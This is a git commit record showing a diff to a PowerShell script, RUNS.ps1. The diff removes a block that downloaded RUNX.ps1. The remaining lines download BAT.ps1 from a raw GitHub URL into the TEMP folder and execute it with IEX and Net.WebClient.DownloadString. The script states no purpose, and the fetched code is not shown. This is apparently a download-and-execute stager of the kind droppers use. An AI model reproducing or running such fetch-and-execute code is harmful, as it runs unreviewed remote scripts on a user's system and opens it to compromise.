c68b0301fb10d5b4610a29a9c2491d560bcd90f9
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-14 22:55:28 +0700

    Update RUNS.ps1

--- RUNS.ps1
+++ RUNS.ps1
@@ -8,6 +8,4 @@ $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
 $output3 = "$env:TEMP\BAT.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
 IEX ((New-Object Net.WebClient).DownloadString($output3))
-$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNX.ps1"
-$output2 = "$env:TEMP\RUNX.ps1"
-Invoke-WebRequest -Uri $url2 -OutFile $output2
+
